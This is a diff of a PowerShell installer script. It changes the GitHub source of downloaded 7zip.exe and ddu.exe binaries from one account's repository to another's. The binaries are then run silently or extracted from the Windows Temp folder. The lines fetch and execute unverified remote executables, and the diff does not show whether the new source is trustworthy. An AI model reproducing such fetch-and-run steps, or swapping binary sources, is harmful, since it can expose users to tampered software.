@@ -32,7 +32,7 @@
 Write-Host "Installing: 7-Zip File Manager`n"
 
 # download 7zip
-IWR "https://github.com/FR33THYFR33THY/Ultimate-Files/raw/refs/heads/main/7zip.exe" -OutFile "$env:SystemRoot\Temp\7zip.exe"
+IWR "https://github.com/o9ll/Ultimate-Files/raw/refs/heads/main/7zip.exe" -OutFile "$env:SystemRoot\Temp\7zip.exe"
 
 # install 7zip
 Start-Process -Wait "$env:SystemRoot\Temp\7zip.exe" -ArgumentList "/S"
@@ -49,7 +49,7 @@ Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\7-Zip" -Recu
 Write-Host "Downloading: Display Driver Uninstaller`n"
         
 # download ddu
-IWR "https://github.com/FR33THYFR33THY/Ultimate-Files/raw/refs/heads/main/ddu.exe" -OutFile "$env:SystemRoot\Temp\ddu.exe"
+IWR "https://github.com/o9ll/Ultimate-Files/raw/refs/heads/main/ddu.exe" -OutFile "$env:SystemRoot\Temp\ddu.exe"
 
 # extract ddu with 7zip
 & "$env:SystemDrive\Program Files\7-Zip\7z.exe" x "$env:SystemRoot\Temp\ddu.exe" -o"$env:SystemRoot\Temp\ddu" -y | Out-Null
@@ -146,7 +146,7 @@ exit
 Write-Host "Installing: 7-Zip File Manager`n"
 
 # download 7zip
-IWR "https://github.com/FR33THYFR33THY/Ultimate-Files/raw/refs/heads/main/7zip.exe" -OutFile "$env:SystemRoot\Temp\7zip.exe"
+IWR "https://github.com/o9ll/Ultimate-Files/raw/refs/heads/main/7zip.exe" -OutFile "$env:SystemRoot\Temp\7zip.exe"
 
 # install 7zip
 Start-Process -Wait "$env:SystemRoot\Temp\7zip.exe" -ArgumentList "/S"
@@ -163,7 +163,7 @@ Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\7-Zip" -Recu
 Write-Host "Downloading: Display Driver Uninstaller`n"
 
 # download ddu
-IWR "https://github.com/FR33THYFR33THY/Ultimate-Files/raw/refs/heads/main/ddu.exe" -OutFile "$env:SystemRoot\Temp\ddu.exe"
+IWR "https://github.com/o9ll/Ultimate-Files/raw/refs/heads/main/ddu.exe" -OutFile "$env:SystemRoot\Temp\ddu.exe"
 
 # extract ddu with 7zip
 & "$env:SystemDrive\Program Files\7-Zip\7z.exe" x "$env:SystemRoot\Temp\ddu.exe" -o"$env:SystemRoot\Temp\ddu" -y | Out-Null
